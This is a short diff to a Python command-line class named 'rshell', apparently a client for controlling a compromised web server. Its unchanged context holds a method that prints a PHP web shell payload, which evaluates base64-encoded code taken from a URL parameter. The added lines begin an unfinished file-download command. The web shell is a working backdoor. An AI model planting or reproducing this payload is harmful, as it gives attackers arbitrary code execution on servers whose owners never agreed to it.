@@ -7,7 +7,6 @@ from cmd import Cmd
 import os
 
 
-
 class rshell(Cmd):
 
     pwd = ""
@@ -83,3 +82,7 @@ class rshell(Cmd):
 
     def print_payload(self):
         print "<?php eval(base64_decode($_GET['param'])); ?>"
+
+    def do_download(self, line):
+        files = line.split()
+        
